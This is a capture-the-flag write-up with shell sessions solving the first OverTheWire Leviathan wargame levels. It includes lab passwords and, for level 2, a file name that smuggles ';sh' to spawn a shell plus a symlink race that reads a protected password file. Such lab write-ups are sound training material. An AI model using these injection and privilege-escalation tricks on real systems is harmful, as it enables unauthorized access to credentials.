# [LEVIATHAN](https://overthewire.org/wargames/leviathan/)

## Level 0 -> Level 1
```bash
$ grep "leviathan1" ~/.backup/bookmarks.html 
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

## Level 1 -> Level 2
```bash
$ ./check 
password: sex
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

## Level 2 -> Level 3
### Method 1
```bash
$ touch "/tmp/db;sh"
 ./printfile "/tmp/db;sh"
/bin/cat: /tmp/db: No such file or directory
$ whoami
leviathan3
$ cat /etc/leviathan_pass/leviathan3
Ahdiemoo1j
```
### Method 2 (**TOCTOU race**)
```bash
$ mkdir /tmp/whokilleddb
$ touch /tmp/whokilledb/symlink\ space  
$ ln -s /etc/leviathan_pass/leviathan3 /tmp/whokilledb/symlink
$ ./printfile /tmp/whokilledb/symlink\ space
Ahdiemoo1j
/bin/cat: space: No such file or directory
```
